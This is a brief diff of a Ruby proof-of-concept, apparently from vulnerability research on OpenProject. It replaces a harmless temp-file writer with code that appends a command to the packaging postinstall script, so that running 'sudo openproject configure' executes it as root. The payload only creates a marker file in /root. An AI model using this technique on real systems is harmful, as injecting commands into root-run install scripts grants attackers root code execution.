@@ -1,10 +1,6 @@
-pid = fork do
-  path = "/tmp/poc.txt"
-  content = "poc: created by pid=#{Process.pid} at #{Time.now}\n"
+# This will make sudo openproject configure create /root/root-rce.txt.
+path = "/opt/openproject/packaging/scripts/postinstall"
 
-  File.open(path, "w") do |f|
-    f.write(content)
-  end
+File.open(path, "a") do |f|
+  f.puts "touch /root/root-rce.txt"
 end
-
-Process.detach(pid)
